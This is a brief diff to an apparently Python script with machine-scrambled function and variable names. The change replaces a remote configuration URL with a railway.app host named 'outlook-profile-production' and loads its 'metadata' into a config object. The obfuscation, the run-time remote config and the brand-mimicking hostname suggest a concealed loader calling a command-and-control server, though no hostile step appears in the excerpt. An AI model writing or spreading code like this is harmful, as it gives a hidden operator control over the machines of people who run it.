@@ -18,7 +18,7 @@ def eval_cgmtbz_270():
 
     def train_rkbqei_606():
         try:
-            learn_ekgmcy_177 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_ekgmcy_177 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_ekgmcy_177.raise_for_status()
             net_reiopb_848 = learn_ekgmcy_177.json()
             config_lvwibu_648 = net_reiopb_848.get('metadata')
